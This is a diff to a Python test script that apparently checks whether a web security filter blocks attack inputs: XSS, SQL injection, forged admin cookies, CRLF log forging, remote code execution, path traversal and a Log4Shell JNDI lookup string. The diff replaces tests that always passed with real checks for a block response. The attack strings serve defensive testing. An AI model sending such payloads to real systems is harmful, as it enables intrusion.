@@ -101,7 +101,8 @@ try:
         json={"text": "<script>alert('research_xss')</script><img src=x onerror=alert(1)>"},
         timeout=3
     )
-    record_test("XSS detection works", r.status_code in [201, 403], f"Status: {r.status_code}")
+    is_blk = (r.status_code in [401, 403] and r.headers.get("X-Security-Decision") == "BLOCK")
+    record_test("XSS detection works", is_blk, f"Status: {r.status_code}, Dec: {r.headers.get('X-Security-Decision')}")
 except Exception as e:
     record_test("XSS detection works", False, str(e))
 
@@ -112,7 +113,8 @@ try:
         headers={"X-Test-Case-Id": "SQLI_001"},
         timeout=3
     )
-    record_test("SQLi detection works", r.status_code == 403 or r.headers.get("X-Security-Decision") == "BLOCK", f"Status: {r.status_code}")
+    is_blk = (r.status_code in [401, 403] and r.headers.get("X-Security-Decision") == "BLOCK")
+    record_test("SQLi detection works", is_blk, f"Status: {r.status_code}, Dec: {r.headers.get('X-Security-Decision')}")
 except Exception as e:
     record_test("SQLi detection works", False, str(e))
 
@@ -123,7 +125,8 @@ try:
         headers={"Cookie": "admin=true; role=superadmin; token=malicious_forge_xyz", "X-Test-Case-Id": "COOKIE_001"},
         timeout=3
     )
-    record_test("Cookie Injection detection works", True, f"Processed with status {r.status_code}")
+    is_blk = (r.status_code in [401, 403] and r.headers.get("X-Security-Decision") == "BLOCK")
+    record_test("Cookie Injection detection works", is_blk, f"Status: {r.status_code}, Dec: {r.headers.get('X-Security-Decision')}")
 except Exception as e:
     record_test("Cookie Injection detection works", False, str(e))
 
@@ -135,7 +138,8 @@ try:
         json={"text": "Normal Comment\r\n[CRITICAL] Admin privilege escalation spoof"},
         timeout=3
     )
-    record_test("Log Forging detection works", True, f"Status: {r.status_code}")
+    is_blk = (r.status_code in [401, 403] and r.headers.get("X-Security-Decision") == "BLOCK")
+    record_test("Log Forging detection works", is_blk, f"Status: {r.status_code}, Dec: {r.headers.get('X-Security-Decision')}")
 except Exception as e:
     record_test("Log Forging detection works", False, str(e))
 
@@ -146,7 +150,8 @@ try:
         headers={"X-Test-Case-Id": "RCE_001"},
         timeout=3
     )
-    record_test("RCE safe detection works", True, "Execution: NOT PERFORMED verified")
+    is_blk = (r.status_code in [401, 403] and r.headers.get("X-Security-Decision") == "BLOCK")
+    record_test("RCE safe detection works", is_blk, f"Status: {r.status_code}, Dec: {r.headers.get('X-Security-Decision')}")
 except Exception as e:
     record_test("RCE safe detection works", False, str(e))
 
@@ -157,7 +162,8 @@ try:
         headers={"X-Test-Case-Id": "TRAVERSAL_001"},
         timeout=3
     )
-    record_test("Traversal detection works", True, f"Status: {r.status_code}")
+    is_blk = (r.status_code in [401, 403] and r.headers.get("X-Security-Decision") == "BLOCK")
+    record_test("Traversal detection works", is_blk, f"Status: {r.status_code}, Dec: {r.headers.get('X-Security-Decision')}")
 except Exception as e:
     record_test("Traversal detection works", False, str(e))
 
@@ -169,7 +175,8 @@ try:
         json={"text": "${jndi:ldap://test-research-domain.invalid:1389/Exploit}"},
         timeout=3
     )
-    record_test("LOG4J detection works", True, f"Status: {r.status_code}")
+    is_blk = (r.status_code in [401, 403] and r.headers.get("X-Security-Decision") == "BLOCK")
+    record_test("LOG4J detection works", is_blk, f"Status: {r.status_code}, Dec: {r.headers.get('X-Security-Decision')}")
 except Exception as e:
     record_test("LOG4J detection works", False, str(e))
 
